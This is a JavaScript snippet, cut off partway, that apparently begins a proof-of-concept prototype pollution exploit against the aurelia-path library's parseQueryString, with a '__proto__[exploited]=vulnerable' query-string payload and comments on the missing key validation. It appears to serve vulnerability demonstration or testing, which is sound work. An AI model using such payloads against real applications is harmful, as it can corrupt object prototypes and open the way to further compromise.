```js
async function exploit() {
  const { parseQueryString } = await import('aurelia-path');

  // Payload attempts to reach Object.prototype via __proto__ key traversal
  const payload = '__proto__[exploited]=vulnerable';

  // parseQueryString recursively assigns query keys to intermediate objects.
  // In the vulnerable version, it lacks validation for dangerous property names.
